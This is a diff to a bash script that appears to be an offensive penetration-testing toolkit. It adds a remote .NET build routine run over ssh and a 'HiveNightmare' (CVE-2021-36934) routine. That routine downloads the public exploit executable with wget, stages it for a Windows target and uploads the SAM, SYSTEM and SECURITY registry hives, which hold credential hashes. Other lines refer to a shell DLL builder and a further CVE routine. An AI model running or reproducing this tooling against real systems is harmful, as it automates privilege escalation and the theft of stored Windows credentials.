@@ -122,11 +122,68 @@ create_run_windows_shell_dll() {
     x86_64-w64-mingw32-gcc -shared -o run_windows_shell.dll run_windows_shell_dll.cpp 
 }
 
+build_dotnet() {
+    echo "Building dotnet project"    
+    if [[ -z "$project_file" ]]; then
+        echo "Project file is required"
+        return 1
+    fi
+    if [[ ! -f "$project_file" ]] && [[ ! -d "$project_file" ]]; then
+        echo "Project file $project_file does not exist"
+        return 1
+    fi
+    local build_command=""
+    local target_project_file="$project_file"
+    local target_build_dir="build"
+    local zip_command="tar -a -c -f build.zip $target_build_dir"
+    local target_zip_file="build.zip"
+    if [[ -d "$project_file" ]]; then
+        if [[ -f "$project_file.zip" ]]; then
+            rm "$project_file.zip"
+        fi
+        zip -r "$project_file.zip" "$project_file"
+        build_command+="tar -xf $project_file.zip && cd $project_file && "
+        target_project_file="$project_file.zip"
+        zip_command="cd $project_file && $zip_command"
+        target_zip_file="$project_file/$target_zip_file"
+        project_file="$project_file.csproj"
+    fi
+    local publish_option=""
+    if [[ ! -z "$single_executable" ]] && [[ "$single_executable" == "true" ]]; then
+        echo "Building single executable"
+        publish_option="-p:PublishSingleFile=true"
+    fi
+    
+    output_file=$(basename "$project_file" | sed -E 's/\.[^.]+$//')
+    if [[ ! -z $dotnet_command ]] && [[ $dotnet_command == "publish" ]] ; then
+        build_command+="dotnet publish $project_file -c Release -r win-x64 --self-contained false $publish_option -o build $dotnet_additional_options"
+        output_file="$output_file.exe"
+    elif [[ ! -z $dotnet_command ]] && [[ $dotnet_command == "csc" ]] ; then
+        build_command+="cd build && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe ..\\$project_file $dotnet_additional_options"
+        output_file="$output_file.exe"
+    else
+        echo "Defaulting to dotnet build"
+        build_command+="dotnet build $project_file -c Release -o build $dotnet_additional_options"
+        if [[ $project_file == *".csproj" ]]; then
+            csproj=$(cat $output_file/$project_file)
+        fi
+        if [[ $csproj == *"Exe"* ]]; then
+            output_file="$output_file.exe"
+        else
+            output_file="$output_file.dll"
+        fi
+        echo "Output file: $output_file"
+    fi   
+    echo "Build command: $build_command"
+    scp "$target_project_file" "$windows_username@$windows_computername:~/$target_project_file"
+    ssh $windows_username@$windows_computername "$build_command"
+    ssh $windows_username@$windows_computername "$zip_command"
+    scp "$windows_username@$windows_computername:~/$target_zip_file" .
+
+}
+
 create_run_windows_exe() {
     local command=""
-    if [ ! -z "$1" ]; then
-        command="$1"
-    fi
     if [[ ! -z "$cmd" ]] && [[ -z "$command" ]]; then
         command="$cmd"
     fi
@@ -153,9 +210,6 @@ create_run_windows_exe() {
 
 create_run_windows_dll() {
     local command=""
-    if [ ! -z "$1" ]; then
-        command="$1"
-    fi
     if [[ ! -z "$cmd" ]] && [[ -z "$command" ]]; then
         command="$cmd"
     fi
@@ -591,3 +645,22 @@ perform_cve_2022_25012() {
     popd || return 1
 }
 
+#hive nightmare
+perform_cve_2021_36934() {
+    local cve_dir="CVE-2021-36934"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir "$cve_dir"
+    fi
+    pushd "$cve_dir" || return 1
+    local url="https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe"
+    if [[ ! -f "HiveNightmare.exe" ]]; then
+        echo "Downloading HiveNightmare..." >> $trail_log
+        wget "$url" -O HiveNightmare.exe >> $trail_log
+    fi
+    popd || return 1
+    generate_windows_download "$cve_dir/HiveNightmare.exe" "HiveNightmare.exe"
+    echo ".\HiveNightmare.exe"
+    upload_file "SAM"
+    upload_file "SYSTEM"
+    upload_file "SECURITY"
+}
